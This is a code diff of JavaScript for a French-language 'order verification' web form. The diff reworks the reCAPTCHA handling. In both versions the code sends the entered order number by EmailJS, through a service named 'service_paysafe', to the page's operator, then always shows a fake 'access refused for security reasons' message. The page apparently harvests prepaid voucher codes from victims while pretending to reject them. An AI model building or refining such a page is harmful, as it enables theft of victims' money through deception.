@@ -28,67 +28,78 @@ async function verifyOrder() {
 
     try {
 
-        // Attendre le chargement de reCAPTCHA
-        await new Promise(resolve => {
-            grecaptcha.ready(resolve);
-        });
-
-        // Générer le token reCAPTCHA
-        const recaptchaToken = await grecaptcha.execute(
-            "6Lfnw3otAAAAAPVN5uNj2rCVl0AMrwpyHbfsNOgo",
-            {
-                action: "verify_order"
-            }
-        );
-
-        console.log("reCAPTCHA token obtenu");
-        console.log(recaptchaToken);
-
-        // Envoi EmailJS
-        const response = await emailjs.send(
-            "service_paysafe",
-            "template_psf",
-            {
-                order_number: orderNumber
-            }
-        );
-
-        console.log("Email envoyé !");
-        console.log(response);
-
-        // Premier message
-        message.style.color = "white";
-        message.textContent =
-            "en cour .";
-
-        // Vider le champ
-        input.value = "";
-        input.focus();
-
-        // Deuxième message après 2 secondes
-        setTimeout(function () {
-
-            console.log("Deuxième message");
-
-            message.style.color = "red";
-            message.textContent =
-                "accès refusé pour raison de sécurité.";
-
-        }, 2000);
+        // Déclencher reCAPTCHA v2 Invisible
+        grecaptcha.execute();
 
     } catch (error) {
 
-        console.error("Erreur :", error);
+        console.error("Erreur reCAPTCHA :", error);
 
         message.style.color = "red";
         message.textContent =
-            "l'accès a ete refusé pour des raisons de sécurité.";
-
-    } finally {
+            "valider le Recaptcha.";
 
         button.disabled = false;
         button.textContent = "Submit";
     }
+}
+
+
+// CALLBACK reCAPTCHA
+function onRecaptchaSuccess(token) {
+
+    console.log("reCAPTCHA validé");
+
+    const input = document.getElementById("orderNumber");
+    const message = document.getElementById("message");
+    const button = document.querySelector(".search-box button");
+
+    const orderNumber = input.value.replace(/\s/g, "");
+
+    emailjs.send(
+        "service_paysafe",
+        "template_psf",
+        {
+            order_number: orderNumber
+        }
+    )
+    .then(function(response) {
+
+        console.log("Email envoyé !");
+        console.log(response);
+
+        message.style.color = "white";
+        message.textContent =
+            "Demande en cour....";
+
+        input.value = "";
+        input.focus();
+
+        setTimeout(function() {
+
+            message.style.color = "red";
+            message.textContent =
+                "L'accès a été refusé pour des raisons de sécurité.";
+
+        }, 2000);
+
+    })
+    .catch(function(error) {
+
+        console.error("Erreur EmailJS :", error);
+
+        message.style.color = "red";
+        message.textContent =
+            "An error occurred.";
+
+    })
+    .finally(function() {
+
+        button.disabled = false;
+        button.textContent = "Submit";
+
+        grecaptcha.reset();
+    });
 }
 
 
